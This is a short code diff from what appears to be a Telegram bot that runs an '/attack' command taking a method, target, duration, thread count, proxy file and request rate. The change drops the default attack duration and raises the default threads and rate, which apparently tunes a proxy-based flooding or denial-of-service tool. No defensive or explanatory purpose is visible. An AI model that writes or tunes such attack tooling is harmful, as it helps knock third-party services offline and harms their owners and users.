@@ -174,10 +174,10 @@ bot.on('message', async (msg) => {
   if (text.startsWith('/attack')) {
     const args = text.split(/\s+/).slice(1)
     let [method, target, timeStr, threadsStr, proxyFile, rateStr] = args
-    const time = parseInt(timeStr) || 25
-    const threads = parseInt(threadsStr) || 8
+    const time = parseInt(timeStr)
+    const threads = parseInt(threadsStr) || 10
     const proxy = proxyFile || './prx.txt'
-    const rate = parseInt(rateStr) || 4
+    const rate = parseInt(rateStr) || 25
 
 
     if (!target) {
